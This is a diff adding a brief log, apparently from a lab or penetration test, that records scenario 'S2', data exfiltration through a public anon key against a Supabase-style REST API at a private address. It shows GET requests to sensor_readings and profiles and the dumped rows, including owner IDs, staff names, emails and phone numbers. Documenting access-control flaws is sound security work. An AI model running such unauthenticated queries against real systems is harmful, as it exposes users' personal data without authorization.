@@ -1,0 +1,19 @@
+# S2 data exfiltration via anon key (KONDISI RAPUH) - target 172.16.6.10
+# 2026-10-25 18:09:21 UTC
+
+## GET /rest/v1/sensor_readings
+[{"id":1,"owner_id":"82eca525-cb24-43bb-8ef8-2e3011fd53df","suhu":29.60,"kelembapan":78.90,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":2,"owner_id":"9ab10025-b8bc-407f-8da4-582894306d4e","suhu":29.48,"kelembapan":66.97,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":3,"owner_id":"3ccee081-7034-47e0-8004-8ffceb8d4f79","suhu":28.51,"kelembapan":79.68,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":4,"owner_id":"dc4cd9d7-4c16-46ee-8442-0f9800e725db","suhu":29.39,"kelembapan":74.38,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":5,"owner_id":"5e145a02-1e4d-41c1-9b47-7bdafafc3241","suhu":29.52,"kelembapan":64.74,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":6,"owner_id":"c8e5541a-9ccd-4129-8433-082169c81959","suhu":28.42,"kelembapan":65.99,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":7,"owner_id":"898130dc-eaa7-4c23-bfa1-a3d9488b0270","suhu":26.42,"kelembapan":66.92,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":8,"owner_id":"c36c3366-3457-44bc-9002-fca3b1a35a09","suhu":27.08,"kelembapan":69.35,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":9,"owner_id":"b836d062-7d24-4954-ab75-2088d356a2cc","suhu":27.72,"kelembapan":64.26,"ts":"2026-10-25T15:17:32.347752+00:00"}, 
+ {"id":10,"owner_id":"eaa1c963-9224-4419-be1a-0ef2e870a182","suhu":25.68,"kelembapan":69.04,"ts":"2026-10-25T15:17:32.347752+00:00"}]
+
+## GET /rest/v1/profiles
+[{"id":"d8929bf2-7506-4b69-8b3f-2b2f5688e228","nama":"Mitra Admin","email":"admin@sahirafarm.id","no_hp":"0812-0000-0001"}, 
+ {"id":"45bf1bc6-56f0-4c15-a5bc-465ec728ae8a","nama":"Operator Kebun","email":"operator@sahirafarm.id","no_hp":"0812-0000-0002"}, 
+ {"id":"d9a2ad8b-e7bf-4986-8a2b-e2345b059120","nama":"Teknisi IoT","email":"teknisi@sahirafarm.id","no_hp":"0812-0000-0003"}]
